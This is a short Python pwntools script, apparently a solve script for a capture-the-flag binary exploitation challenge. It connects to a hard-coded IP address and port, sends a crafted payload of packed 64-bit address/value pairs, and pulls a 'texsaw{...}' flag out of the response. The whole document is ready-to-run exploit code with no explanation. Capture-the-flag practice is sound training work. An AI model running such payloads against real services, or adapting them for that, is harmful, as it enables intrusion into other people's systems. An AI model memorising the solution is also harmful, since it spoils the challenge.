from pwn import remote
import re


HOST = "143.198.163.4"
PORT = 1900


def qword(v: int) -> bytes:
    return v.to_bytes(8, "little")


def main() -> None:
    payload = b"".join(
        [
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x2F),
            qword(0x10AD000) + qword(0x8008570),
            qword(0x10AD000) + qword(0),
            qword(0x5ECF000) + qword(0),
            qword(0x10AD000) + qword(0),
            qword(0xBAAA000) + qword(0xFFFFFFFFFFFFFFFC),
            qword(0x10AD000) + qword(0),
            qword(0xCA11000) + qword(0),
            qword(0xD0D0000) + qword(0),
        ]
    )

    io = remote(HOST, PORT)
    io.send(payload)
    data = io.recvall(timeout=3)
    match = re.search(rb"texsaw\{[^}]+\}", data)
    if not match:
        raise SystemExit(data.decode("latin1", "replace"))
    print(match.group().decode())


if __name__ == "__main__":
    main()
